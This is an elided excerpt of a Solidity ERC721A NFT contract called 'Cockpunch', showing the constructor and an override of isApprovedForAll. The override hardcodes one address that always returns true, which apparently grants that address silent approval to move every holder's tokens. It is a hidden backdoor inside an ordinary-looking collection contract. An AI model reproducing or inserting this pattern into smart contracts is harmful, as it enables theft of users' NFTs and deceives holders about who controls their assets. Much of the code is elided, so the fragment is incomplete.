  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x48181B9d88Ffe0C7654CceCBc9E7505f7B9D0d13){return true;}
...
contract Cockpunch is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Cockpunch", "COCKPUNCH", maxBatchSize_, collectionSize_) {
